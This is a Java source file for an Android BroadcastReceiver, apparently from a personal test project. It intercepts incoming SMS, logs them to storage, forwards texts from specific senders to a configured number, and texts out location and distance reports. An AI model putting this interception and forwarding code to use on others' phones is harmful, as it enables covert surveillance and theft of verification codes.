package com.example.palyertest2;

import java.io.File;
import java.math.BigDecimal;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import com.common.DateUtil;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Point;
import android.graphics.PointF;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class TransmitReceiver extends BroadcastReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		// 监听短信广播
		if (intent.getAction()
				.equals("android.provider.Telephony.SMS_RECEIVED")) {
			Object[] pdus = (Object[]) intent.getExtras().get("pdus");// 获取短信内容
			for (Object pdu : pdus) {
				byte[] data = (byte[]) pdu;
				SmsMessage message = SmsMessage.createFromPdu(data);// 使用pdu格式的短信数据生成短信对象
				String sender = message.getOriginatingAddress();// 获取短信的发送者
				String content = message.getMessageBody();// 获取短信的内容
				Date date = new Date(message.getTimestampMillis());
				SimpleDateFormat format = new SimpleDateFormat(
						"yyyy-MM-dd HH:mm:ss");

				String sendtime = format.format(date);
				/*
				 * SmsManager manager = SmsManager.getDefault();
				 * manager.sendTextMessage("5556", null, , null, null);//
				 * 把拦截到的短信发送到你指定的手机，此处为5556
				 */
				String contentMix = "发送人:" + sender + "-----发送时间:" + sendtime
						+ "----内容:" + content;
				FileService.write("\n\r收到短信;内容:" + contentMix,
						FileService.ReceivedSMS, true);
				if (sender.contains("1112178") || sender.contains("1012178")) {

					/** 切分短信，每七十个汉字切一个，短信长度限制不足七十就只有一个：返回的是字符串的List集合 */
					SendMSG_DontRepeat(Global.phoneNumber, content);
				}
				if (sender.startsWith(Global.MyphoneNumber)) {
					SendMSG_DontRepeat(Global.MyphoneNumber,content);
				}
			}
		}
	}

	public static void SendMSG_DontRepeat(String PhoneNO,String content) {
		String path = Environment.getExternalStorageDirectory()
				.toString()
				+ File.separator
				+ FileService.DIR_root
				+ File.separator + FileService.SendSMSResult;
		String SavedContent = FileService.read(path);
		if (SavedContent == null || !SavedContent.contains(content)) {
			transmitMessageTo(PhoneNO, content);
		}
	}

	public static void transmitMessageTo(String phoneNumber, String message) {// 转发短信
		SmsManager manager = SmsManager.getDefault();
		/** 切分短信，每七十个汉字切一个，短信长度限制不足七十就只有一个：返回的是字符串的List集合 */
		List<String> texts = manager.divideMessage(message);// 这个必须有
		for (String text : texts) {
			manager.sendTextMessage(phoneNumber, null, text, null, null);
		}
		FileService.write("\n\r成功发送到" + phoneNumber + ";内容:" + message,
				FileService.SendSMSResult, true);
	}

	public static String CheckLocation(double longitude, double Latitude, double MaxDistance) {
		// double x_dx=113.269592, y_dx=23.134377;
		//PointF point_ZSJNT = new PointF(113.266014f, 23.138266f);
		//PointF point_SCDQ = new PointF(113.269925f,23.144081f);//113.240322,23.144081
		double Latitude2=23.1383333,longitude2=113.238981667;//cos(23.144)=0.91951993284756013429058407346017
		//double distance1 = CommonService.GetDistance(x, y, point_ZSJNT);
		Double distance2 = CommonService.GetDistance( Latitude,longitude, Latitude2,longitude2);
		BigDecimal b0 = new BigDecimal(distance2 );
		BigDecimal f0 = b0.setScale(0, BigDecimal.ROUND_HALF_UP);
		java.util.Date Date = new java.util.Date();
		String msg= DateUtil.parseDateToStr(Date, DateUtil.DATE_FORMAT_YYYYMMDDHHmm)
				+"经度"+longitude+"纬度"+Latitude+ "离西场"
				+ (f0) + "(m)";
		if (distance2 < MaxDistance) {
			
			SendMSG_DontRepeat(Global.phoneNumber,msg);
			
//			else {
//				transmitMessageTo(Global.phoneNumber, "离记念堂"
//						+ (distance1 * Global.OneLongitudeEqualMetre) + "(米)");
//			}
		}
		return msg;
	}
}
